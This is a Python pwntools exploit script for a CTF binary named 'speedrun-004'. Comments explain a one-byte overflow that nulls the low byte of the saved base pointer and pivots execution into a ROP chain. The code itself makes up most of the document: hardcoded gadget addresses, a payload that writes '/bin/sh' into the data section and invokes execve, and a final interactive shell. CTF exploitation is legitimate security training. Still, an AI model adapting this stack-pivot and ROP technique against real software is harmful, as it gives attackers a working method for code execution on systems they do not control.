from pwn import *

'''
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

    (binary is statically compiled, no cheeky ret-lib-c)


    vuln: Single byte overflow allows an attacker to corrupt the lowest bit of the stacks base
          pointer. This in turn allows for a proper ROP to be stored in an earlier point in the
          message buffer, which we "ret" into when the stack base is moved.

    syscall arguments / calling convention for linux x86_64:
    rax: syscall_nr
    arguments: rdi, rsi, rdx, ...

    exploit stategy:
        1. `Null` the LSByte of the base pointer using the overflow
            (-> This decreases RBP and gives us more room to play w/)
        2. Rop chain:
            a. pop RSI
            b. /bin/sh\0
            c. pop RDI
            d. RW section in the binary
            e. store RSI at [RDI]
            f. pop RSI
            g. 0
            h. pop RDX
            i. 0
            j. pop RAX
            k. 59 (sys_execve)

'''

context.update(arch='amd64', os='linux')
e = context.binary = ELF("./speedrun-004")

if args.GDB:
    p = gdb.debug(e.path,

    # b * &leave
    # b first rop gadget
    '''
    b * 0x0400bd0
    b * 0x000000000041d4e3
    continue
    ''')
else:
    p = process(e.path)
libc = e.libc


'''
Gadgets were scouted out with ropper.

0x0000000000474f15: syscall; ret;
0x000000000044788b: mov qword ptr [rdi], rsi; ret;
0x000000000041d4e3: pop rcx; ret;
0x000000000044c6b6: pop rdx; ret;
0x0000000000410a93: pop rsi; ret;
0x0000000000415f04: pop rax; ret;
0x0000000000400416: ret;

'''

ret           = p64(0x0000000000400416)
pop_rdx       = p64(0x000000000044c6b6)
pop_rdi       = p64(0x0000000000400686)
pop_rsi       = p64(0x0000000000410a93)
pop_rax       = p64(0x0000000000415f04)
mov_p_rdi_rsi = p64(0x000000000044788b)
syscall       = p64(0x0000000000474f15)
# The very beginning of .data
data_section  = p64(0x00000000006b90e0)

offset = 257
p.sendlineafter("how much do you have to say?", f"{offset}")


# RET-slide
payload  = ret * 20
# Load "/bin/sh" into RSI
payload += pop_rsi
payload += b"/bin/sh\0"
# Load the destination of "/bin/sh" into RDI
payload += pop_rdi
payload += data_section
# Store "/bin/sh" in the data section
payload += mov_p_rdi_rsi
# Load null into RSI / RDX
payload += pop_rsi
payload += p64(0)
payload += pop_rdx
payload += p64(0)
# Load 59 (sys_execve_nr) into RAX
payload += pop_rax
payload += p64(59)
payload += syscall

padding_len = (offset - len(payload) - 1)
assert padding_len >= 0
log.info(f"Adding {padding_len} bytes of padding")
payload += b"B" * padding_len

# Final null byte, which will overflow into RBP
payload += b"\0"

# Sanity check
assert len(payload) == offset

p.sendlineafter("Ok, what do you have to say for yourself?", payload)

p.interactive()


